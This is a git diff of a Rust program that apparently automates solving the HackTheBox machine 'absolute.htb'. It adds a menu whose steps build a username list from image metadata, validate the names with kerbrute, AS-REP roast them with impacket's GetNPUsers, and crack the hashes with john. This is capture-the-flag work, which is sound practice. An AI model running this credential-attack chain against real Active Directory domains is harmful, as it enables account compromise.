@@ -1,6 +1,9 @@
 use std::io::{stdin, stdout, Write};
 use std::process::{Command, Stdio};
 
+mod step_1;
+mod step_2;
+
 fn main() {
     // Get the IP address from the user
     let mut ip = String::new();
@@ -12,7 +15,7 @@ fn main() {
     ip = ip.trim().to_string();
 
     // Construct the new host entry
-    let host_entry = format!("{}\tabsolute.htb", ip);
+    let host_entry = format!("\n{}\tabsolute.htb dc.absolute.htb", ip);
 
     // Check if the IP address already exists in the /etc/hosts file
     let output = Command::new("grep")
@@ -46,8 +49,8 @@ fn main() {
     // Menu to Select step to pwn machine
     loop {
         println!("\nSelect an option:");
-        println!("1. Option 1");
-        println!("2. Option 2");
+        println!("Step 1. Generate Username List");
+        println!("Step 2. Validate/ASREPRoast");
         println!("3. Option 3");
         println!("4. Quit");
 
@@ -60,12 +63,20 @@ fn main() {
 
         match choice {
             "1" => {
-                println!("You selected Option 1");
-                // Perform the desired action for option 1
+                println!("Getting Images...");
+                step_1::image_grab();
+                println!("Extracting Artist Names");
+                step_1::extract_artist_and_write_to_file();
+                println!("Generating Username List...");
+                step_1::transform_usernames();
             }
             "2" => {
-                println!("You selected Option 2");
-                // Perform the desired action for option 2
+                println!("Validating Usernames...");
+                step_2::run_kerbrute();
+                println!("ASREPRoasting...");
+                step_2::run_impacket_getnpusers();
+                println!("Cracking Hash...");
+                step_2::run_john();
             }
             "3" => {
                 println!("You selected Option 3");
